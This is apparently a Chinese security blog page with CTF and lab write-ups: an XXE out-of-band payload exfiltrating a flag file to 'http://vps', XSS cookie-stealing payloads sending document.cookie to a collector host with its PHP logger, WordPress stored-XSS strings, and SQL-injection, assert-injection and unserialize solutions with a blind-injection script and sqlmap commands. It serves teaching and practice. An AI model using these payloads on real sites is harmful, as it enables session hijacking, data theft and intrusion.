<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % r SYSTEM &quot;http://vps/e.xml&quot;&gt;</span><br><span class="line">%r;</span><br><span class="line">%all;</span><br><span class="line">%s;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
<p>e.xml:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % f SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % s SYSTEM &apos;http://vps/xxe.php?f=%f;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>xxe.php:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file_put_contents(&quot;flag.txt&quot;, $_GET[&apos;f&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/08/07/inject/">代码审计之SQL注入</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-07</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SQL-代码审计/">SQL 代码审计</a></span><div class="content"><p><strong>一些和sql注入有关的代码审计题目</strong></p></div><a class="more" href="/2018/08/07/inject/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/07/27/XSS-h/">XSS高级利用</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-07-27</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/xss/">xss</a></span><div class="content"><a id="more"></a>
<h5 id="利用xss的javascript劫持"><a href="#利用xss的javascript劫持" class="headerlink" title="利用xss的javascript劫持"></a>利用xss的javascript劫持</h5><p>一个xss漏洞示例页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;  </span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;xss&quot;/&gt;  </span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;test&quot;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">    $xss = @$_GET[&apos;xss&apos;];  </span><br><span class="line">    if($xss!==null)&#123;  </span><br><span class="line">        echo $xss;  </span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这段代码中首先包含一个表单，用于向页面自己发送GET请求，带一个名为xss的参数。 然后PHP会读取该参数，如果不为空，则直接打印出来，这里不存在任何过滤。也就是说，如果xss中存在HTML结构性的内容，打印之后会直接解释为HTML元素</p>
</blockquote>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Javascript Hijack with XSS&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://118.25.0.196/script.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php echo $_GET[&quot;xss&quot;]; ?&gt;</span><br><span class="line">&lt;input type=&quot;Submit&quot; onClick=&quot;javascript:Hello()&quot; value=&quot;Say Hello&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>script.js内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Hello()</span><br><span class="line">&#123;</span><br><span class="line">alert(&quot;hi&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当传入xss为<br><code>xss=&lt;script&gt;function Hello() { alert(&quot;hacked&quot;); } &lt;/script&gt;</code>时</p>
<p>鼠标点击会弹出hacked而非预定的hi</p>
<p>这里利用xss漏洞劫持javascript代码</p>
<p>可以传入<code>&lt;script type=&quot;text/javascript&quot; src=&quot;http://[evil server]/hack.js&quot;&gt;&lt;/script&gt;</code>以执行较长的代码</p>
<h5 id="XSS会话劫持"><a href="#XSS会话劫持" class="headerlink" title="XSS会话劫持"></a>XSS会话劫持</h5><p>可以在含xss漏洞的地方使用以下类似代码盗取cookie</p>
<p><code>&lt;script&gt;window.open(&quot;http://x.x.x.x/getcookie.php?cookie=&quot;+document.cookie)&lt;/script&gt;</code></p>
<p>或</p>
<p><code>&lt;script&gt; document.location=&quot;http://x.x.x.x/getcookie.php?cookie=&quot;+document.cookie; &lt;/script&gt;</code></p>
<p>getcookie.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie=@$_GET[<span class="string">'cookie'</span>];</span><br><span class="line">$path=<span class="string">"./cookies.txt"</span>;</span><br><span class="line">file_put_contents($path,$cookie.PHP_EOL, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>为防止察觉，使用javascript</p>
<p><code>&lt;script src=http://x.x.x.x/script.js &gt;&lt;/script&gt;</code></p>
<p>script.js:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var script =document.createElement(&apos;script&apos;);</span><br><span class="line">script.src=&apos;http://x.x.x.x/getcookie.php?cookie=&apos;+escape(document.cookie);</span><br><span class="line">document.body.appendChild(script);</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a0e2f9.png" alt="s4.png"></p>
<h5 id="xss常用的编码"><a href="#xss常用的编码" class="headerlink" title="xss常用的编码"></a>xss常用的编码</h5><p>bWAPP中的XSS - Reflected (AJAX/XML)</p>
<p>输入 <code>&amp;lt;img src=1 onerror=&quot;alert(document.cookie)&quot;&amp;gt;</code><br>弹窗获取cookie</p>
<p><code>&amp;lt;</code>、<code>&amp;gt;</code>分别为<code>&lt;</code>、<code>&gt;</code>的HTML tag</p>
<p>第一个，html实体编码，例如：</p>
<p><code>&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x29;</code></p>
<p>第二个，进制类，例如：</p>
<p><code>\x61\x6c\x65\x72\x74\x60\x78\x73\x73\x60</code></p>
<p>某些时候，也有不带x,例如：<code>\5c\6a</code></p>
<p>第三个，Unicode，例如：</p>
<p><code>\u0061\u006c\u0065\u0072\u0074\u0060\u4e2d\u6587\u4e5f\u53ef\u4ee5\u0060</code></p>
<p>第四个，纯转义，例如：</p>
<p><code>\&#39;   \&quot;   \&lt;   \&gt;</code></p>
<p>这样的在特殊字符前加\进行转义。</p>
<p>html标签中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html中当然会支持html实体编码，例如&amp;#61，也有&amp;lt;</span><br><span class="line">支持十六进制，但是要以&amp;#x开头，其中x大写小写无所谓。</span><br><span class="line">支持十进制，要以&amp;#开头，注意，没有x哦。</span><br><span class="line">支持数字部分高位补充0，例如&amp;#00000000061，&amp;#61这两是一样的。</span><br><span class="line">可能你已经发现了，后缀有没有;  都无所谓</span><br></pre></td></tr></table></figure>
<p>javascript中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval函数里，支持十六进制，但是要以 \x 开头，x只能小写！必须两位，例如：\x5c</span><br><span class="line">eval函数里，支持八进制，但是要以 \ 开头。必须两位，例如：\134</span><br><span class="line">eval函数里，还支持\u前缀的unicode，本质是：16进制的ascii码。必须是四位，例如：\u005c</span><br></pre></td></tr></table></figure>
<h5 id="WordPress-XSS-漏洞"><a href="#WordPress-XSS-漏洞" class="headerlink" title="WordPress XSS 漏洞"></a>WordPress XSS 漏洞</h5><p><a href="http://bobao.360.cn/learning/detail/112.html" target="_blank" rel="noopener">WordPress 3.0-3.92 存储型XSS添加管理员&amp;getshell脚本
</a></p>
<p>于是下载了wordpress-3.8.3在虚拟机测试</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a78778.png" alt="s12.png"></p>
<p>发现管理员登陆时，编辑内容并不会被过滤</p>
<p>编辑文章，回到首页查看</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a04650.png" alt="s8.png"></p>
<p>但是chrome下弹出的cookie似乎被过滤了，最关键的部分并没有，利用js在服务器上获取的cookie同样不完整</p>
<p>firefox下却没问题</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9a7a7a1bb.png" alt="s17.png"></p>
<p>以下两个地方都被插入了代码，也会弹出两次</p>
<p>标题<br><img src="https://i.loli.net/2018/07/29/5b5d9ac65b24b.png" alt="s5.png"><br>侧栏</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ac65c9f6.png" alt="s6.png"></p>
<p>去官网下了个最新版WordPress</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ac6c3a0a.png" alt="s11.png"></p>
<p>管理员的编辑仍不会被过滤</p>
<p>接收到cookie</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9ac706204.png" alt="s162.png"></p>
<p>wordpress站点有多个用户，当不是管理员时</p>
<p>在<a href="https://www.secpulse.com/archives/2365.html" target="_blank" rel="noopener">WordPress 3.0-3.9.2 XSS 漏洞详细分析</a>看到</p>
<p>漏洞的成因是在/wp-includes/formatting.php中的wptexturize函数</p>
<p>formatting.php应该是用于清理XHTML和用特定字符集正确格式化文本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function wptexturize($text) &#123;</span><br><span class="line"></span><br><span class="line">	......</span><br><span class="line"></span><br><span class="line">	$textarr = preg_split(&apos;/(&lt;.*&gt;|\[.*\])/Us&apos;, $text, -1, PREG_SPLIT_DELIM_CAPTURE);</span><br><span class="line">	</span><br><span class="line">	foreach ( $textarr as &amp;$curl ) &#123;</span><br><span class="line">	</span><br><span class="line">	......</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	return implode( &apos;&apos;, $textarr );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的正则<code>/(&lt;.*&gt;|\[.*\])/Us</code>会匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//这个新姿势能在前台xss弹窗 不限制用户权限 后台的确不能弹窗</span><br><span class="line"></span><br><span class="line">[&lt;a href=&quot;hello&quot; alt=&quot;]&quot;&gt;&lt;/a&gt;[&quot;&lt;script&gt;&lt;/][a&gt;&lt;script&gt;alert(1)&lt;/script&gt;]</span><br><span class="line"></span><br><span class="line">前后台都能弹窗 似乎还是老的onmouseover能用</span><br><span class="line"></span><br><span class="line">[&lt;a href=&quot;test&quot; title=&quot;]&quot;&gt;&lt;/a&gt;[&quot; &lt;!-- onmouseover=alert(/xss/)//&gt;&lt;!-- --&gt;NOT VULNERABLE&lt;a&gt;&lt;/a&gt;]</span><br></pre></td></tr></table></figure>
<p>然而我发现这payload没什么效果，有时间再好好看看，完善一下</p>
<p>下图搬运于<a href="https://github.com/ch3nw3i/XSS" target="_blank" rel="noopener">GitHub - ch3nw3i/XSS: 跨站脚本攻击</a></p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9b114b128.png" alt="xss-1.png"></p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9b11a8825.jpg" alt="xss-3.jpg"></p>
<p><img src="https://i.loli.net/2018/07/29/5b5d9b19d2ac8.png" alt="xss-2.png"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2018/07/25/ctfs_18_7/">CTFs.18.7</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-07-25</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WriteUp/">WriteUp</a></span><div class="content"><a id="more"></a>
<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>bugku新增的一个小题</p>
<p>题目：</p>
<p><code>extract($_GET)</code>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值</p>
<p>payload：<code>http://120.24.86.145:9009/bianliang/?a=&amp;b=</code></p>
<p><code>flag{num_test_administrator}</code></p>
<h3 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h3><p>开始也没发现什么，就抓包用sqlmap跑了</p>
<p>跑了半天，也能跑出来</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf5c7c1.png" alt="s18.png"></p>
<p><code>python sqlmap.py -r /Users/xc/Desktop/post.txt --dbs --drop-set-cookie -D bugkusql1 -T flag1 --dump</code></p>
<p>flag就是那串字符放到flag{}里</p>
<p>这个手动注入也可以，就是换成了<code>&quot;</code>，也没过滤。。。</p>
<p>最后 <code>1&quot; union select flag1,1  from flag1#</code></p>
<h3 id="Webshell分析"><a href="#Webshell分析" class="headerlink" title="Webshell分析"></a>Webshell分析</h3><p>分析文件findwebshell.pcapng</p>
<p>由webshell想到过滤一下POST</p>
<p><code>http.request.method==&quot;POST&quot;</code></p>
<p>然后搜索flag字符串，有两个结果，其中一个最后有类似base64的编码</p>
<p>解码得到图片地址</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf2db89.png" alt="s19.png"></p>
<p>是个二维码，扫描得到flag</p>
<p><code>flag{1542ae716e47576e1f3e36326a23e72e}</code></p>
<h3 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h3><p>测试发现空格被过滤，用注释填充</p>
<p><code>admin&#39;/**/or/**/1=1#</code> 显示密码错误</p>
<p><code>admin&#39;/**/union/**/select/**/database()#</code> 仍显示密码错误</p>
<p>一开始sqlmap跑出injection库和admin表，password弄不出来</p>
<p>用的python脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&apos;http://web.jarvisoj.com:32787/login.php&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">dic = &apos;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for d in dic:</span><br><span class="line">        pl=&quot;admin&apos;/**/and/**/(substr((select/**/password/**/from/**/admin),%s,1)=&apos;%s&apos;)/**/and/**/&apos;1&apos;=&apos;1&quot; %(str(i),d)</span><br><span class="line">        data = &#123;&apos;username&apos;:pl,&apos;password&apos;:&apos;2333&apos;&#125;</span><br><span class="line">        r = s.post(url,data)</span><br><span class="line">        if (&apos;密码错误&apos; in r.content):</span><br><span class="line">        	flag += d</span><br><span class="line">        	print flag</span><br><span class="line">        	break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf5e495.png" alt="s20.png"></p>
<p>后来发现sqlmap也是能跑出来的</p>
<p><code>python sqlmap.py  -u &quot;http://web.jarvisoj.com:32787/login.php&quot; --forms --tamper=space2comment -D injection -T admin -C id,username,password --dump</code></p>
<h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>首先dirb发现<code>.git</code>代码泄露，用githack扒下来源码</p>
<p>有这么一处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>百度了解assert的代码注入</p>
<ol>
<li><p>page接收参数后组合成变量file。</p>
</li>
<li><p>file经过滤..（）防止目录遍历和判断文件是否存在</p>
</li>
<li><p>包含文件</p>
</li>
</ol>
<p>assert()简介：判断一个表达式是否成立。返回true or false。</p>
<p>当参数为字符串时，会被当作php代码执行。</p>
<p>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</p>
<p>assert与eval</p>
<p>assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</p>
<p>payload：</p>
<p><code>page=233&#39;) or print(file_get_contents(&#39;templates/flag.php&#39;));%23</code></p>
<p><code>;</code>后面加%23或//用来注释</p>
<p>flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2fcf2aa32.png" alt="s21.png"></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h3 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h3><p>入口：<a href="http://120.24.86.145:8007/web2/" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/</a></p>
<blockquote>
<p>全都tm过滤了绝望吗？</p>
</blockquote>
<blockquote>
<p>提示 !,!=,=,+,-,^,%</p>
</blockquote>
<p>一边手动测试，一边扫目录找源代码泄露</p>
<p>找到了flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb6ac21.png" alt="s22.png"></p>
<p>没看到网上有注入的wp</p>
<p><code>flag{sql_iNJEct_comMon3600!}</code></p>
<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>提示：hint</p>
<p>扫目录没发现代码泄露，提示hint不是目录，是个get参数</p>
<p>传参得到源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include_once(&quot;flag.php&quot;); </span><br><span class="line">$cookie = $_COOKIE[&apos;ISecer&apos;]; </span><br><span class="line">if(isset($_GET[&apos;hint&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;) </span><br><span class="line">&#123;    </span><br><span class="line">    echo &quot;$flag&quot;; </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">?&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; </span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">&#125; </span><br><span class="line">$KEY=&apos;ISecer:www.isecer.com&apos;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>一开始cookie里加个ISser，值为<code>serialize($KEY)</code>怎么都不行</p>
<p>看wp才发现那时候<code>$KEY</code>还是NULL</p>
<p>构造<code>ISecer=s:0:&quot;&quot;%3B</code></p>
<p><code>flag{unserialize_by_virink}</code></p>
<h3 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h3><p>提示index.php.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure>
<p>传入的id要被urldecode，地址栏的输入要被encode两次</p>
<p>%加字符的16进制</p>
<p><code>?id=%2568%2561%2563%256b%2565%2572%2544%254a</code></p>
<p><code>flag: DUTCTF{PHP_is_the_best_program_language}</code></p>
<h3 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h3><p>flag格式 flag{xxx_xxx_xxx}</p>
<p><a href="http://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg" target="_blank" rel="noopener">图片</a></p>
<p>foremost分出zip包，被加密了</p>
<p>怀疑伪加密，修改文件头0900，解压得到8个文件</p>
<p>其中88，888，8888，三个文件头为jpg类型</p>
<p>修改后缀，88.jpg含二维码，888.jpg的hex里一段base64，foremost分离8888.jpg得到zip包，解压得到二维码</p>
<p>按顺序三个连起来就是flag</p>
<p><img src="https://i.loli.net/2018/07/29/5b5d2efb64913.png" alt="s23.png"></p>
<p><code>flag{bilibili_silisili_panama}</code></p>
<h3 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不是很懂php的正则</p>
<p>贴个详解</p>
<ol>
<li><p>表达式直接写出来的字符串直接利用，如key</p>
</li>
<li><p>“.”代表任意字符</p>
</li>
<li><p>“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次</p>
</li>
<li><p>“\/”代表“/”</p>
</li>
<li><p>[a-z]代表a-z中的任意一个字符</p>
</li>
<li><p>[[:punct:]]代表任意一个字符，包括各种符号</p>
</li>
<li><p>/i代表大小写不敏感</p>
</li>
<li><p>{4-7}代表[0-9]中数字连续出现的次数是4-7次</p>
</li>
</ol>
<p>所以有很多情况</p>
<p>比如：<code>?id=key1key23333key:/3/keyy;</code></p>
<p><code>key is: KEY{0x0SIOPh550afc}</code></p>
<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h3 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h3><p>这个很久之前就看过，没头绪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function SUCTF_$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
<p>也很简单，传入<code>unc_name</code>,执行<code>create_function</code>创建的函数</p>
<p>就是不知道函数名</p>
<p>题目是应该是源自HITCON 2017 Baby^h-master-php的后部分</p>
<p><a href="https://xz.aliyun.com/t/1773/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1773/</a></p>
<p>创建的匿名函数是有名字的,格式是<code>%00lambda_%d</code>,<code>%d</code>是数字</p>
<blockquote>
